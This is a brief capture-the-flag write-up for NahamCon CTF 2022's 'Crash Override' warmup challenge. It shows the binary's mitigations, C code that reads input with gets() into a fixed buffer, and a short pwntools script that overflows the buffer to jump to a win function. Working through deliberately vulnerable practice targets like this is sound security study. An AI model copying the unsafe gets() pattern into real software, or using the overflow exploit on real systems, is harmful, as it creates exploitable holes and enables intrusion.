---
title: "[Warmup] Crash Override [Nahamcon CTF 2022]"
date: 2022-05-06 23:35:00
---

# 0x0 Introduction

Author: @M_alpha#3534

Remember, hacking is more than just a crime. It's a survival trait.

files: [crash_override](crash_override), [crash_override.c](crash_override.c)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

# 0x2 Vuln

very simple buffer overflow

```
void win(int sig) {
    // print flag
}
int main(void) {
    char buffer[2048];
    gets(buffer);

    return 0;
}
```

# 0x3 Exploit

```
io = start()
wait_for_debugger(io)

io.sendlineafter(b"!\n",flat({
    0x800+0x8:exe.sym["win"]
}))

io.interactive()
```

# 0x2 Flag

None